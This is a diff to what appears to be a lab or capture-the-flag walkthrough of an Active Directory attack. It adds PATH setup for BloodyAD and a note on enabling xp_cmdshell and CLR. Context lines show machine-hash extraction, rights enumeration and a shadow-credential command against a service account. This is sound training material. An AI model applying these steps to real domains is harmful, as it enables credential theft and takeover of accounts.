@@ -59,6 +59,11 @@ chmod +x scripts/*.sh scripts/*.py
 ```
 
 Activate `.venv` again in each new local terminal that runs a Python helper.
+Tools installed with `pipx`, including BloodyAD on this Kali system, are normally exposed under `/root/.local/bin`. Add both user-tool directories for the current shell:
+
+```bash
+export PATH="$PATH:/root/.local/bin:/root/.dotnet/tools"
+```
 
 Record the current addresses and map the virtual host:
 
@@ -599,6 +604,8 @@ The identities and scopes are important:
 - `bulkadmin` permits server-side bulk-file operations.
 - `xp_cmdshell` and CLR were initially disabled, so the audit login did not yet have direct command execution.
 
+Those values describe the first pass through the box. Section 8.3 enables `show advanced options` and `xp_cmdshell`, and section 8.4 enables CLR. SQL Server retains those settings, so repeating this enumeration later on the same instance can legitimately return `1` for all three values.
+
 SQL Server performs `OPENROWSET(BULK...)` file access in the SQL Server process context. A local-file control and the rotated error logs confirmed that access and revealed the Windows service identity:
 
 ```bash
@@ -819,6 +826,9 @@ A domain machine account is an Active Directory security principal. Its NT hash 
 Internal enumeration identified DC01 at `172.16.0.10`. The wrapper extracts the NT hash from the `secretsdump` transcript and queries effective rights through ProxyChains:
 
 ```bash
+export PATH="$PATH:/root/.local/bin"
+command -v bloodyAD
+
 ./scripts/bloody-machine.sh \
   get membership 'ODYSSEY-DB$'
 
@@ -847,6 +857,13 @@ msDS-KeyCredentialLink: WRITE
 ### 9.1 Shadow credential on `svc-aegis-build`
 
 `msDS-KeyCredentialLink` stores key credentials that can be used for certificate-based Kerberos authentication. Write access lets the machine account register an attacker-controlled public key on `svc-aegis-build`; possession of the corresponding private key then permits PKINIT as that account without knowing its password.
+
+Make sure the `pipx` application directory is available in this terminal before invoking BloodyAD directly:
+
+```bash
+export PATH="$PATH:/root/.local/bin"
+command -v bloodyAD
+```
 
 ```bash
 ./scripts/bloody-machine.sh add shadowCredentials \
